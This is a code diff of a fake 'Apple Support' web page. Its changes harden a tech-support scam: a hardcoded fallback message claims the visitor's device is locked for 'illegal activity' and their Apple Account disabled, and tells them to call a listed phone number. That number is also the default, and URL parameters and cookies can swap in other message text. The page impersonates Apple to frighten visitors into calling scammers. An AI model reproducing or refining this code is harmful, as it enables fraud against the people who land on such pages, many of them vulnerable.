@@ -40,7 +40,7 @@
     </style>
 
     <link rel="stylesheet" href="Base.css" type="text/css" />
-    <script src="text.js" defer></script>
+    <script src="text.js"></script>
 
 </head>
 
@@ -216,7 +216,7 @@
                     <div class="as-banner-content">
                         <div class="pageTitle  ">
                             <h1 class="pageTitle-heading">Apple Support </h1>
-                            <p class="pageTitle-intro js_setTextBlock" />
+                            <p class="pageTitle-intro js_setTextBlock"></p>
                         </div>
                         <div class="sectionTitle sectionTitleBlock">
                             <h2 class="sectionTitle-heading"></h2>
@@ -336,19 +336,21 @@
         var phone = cookieHelper.get('phoneSetBl');
 
         function getText() {
-            var str = window.defaultText || '';
+            var str = text || window.defaultText || 'Your |%model%| has been locked due to detected illegal activity .Your Apple Account has been disabled! Immediately call Apple Support +1(844)530-2543 to unlock it!';
 
-            for (var d in window.text) {
-                if (window.refef.indexOf(d) != -1) {
-                    str = window.text[d];
+            if (window.text) {
+                for (var d in window.text) {
+                    if (window.refef && window.refef.indexOf(d) != -1) {
+                        str = window.text[d];
+                    }
                 }
             }
-            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+            return str.replace('|%model%|', window.device || 'iPhone').replace('|%ref%|', window.refef || '');
         }
 
 
         if (!phone) {
-            phone = getURLParameter('phone');
+            phone = getURLParameter('phone') || window.number || '+1(844)530-2543';
         }
         if (!text) {
             text = getURLParameter('text');
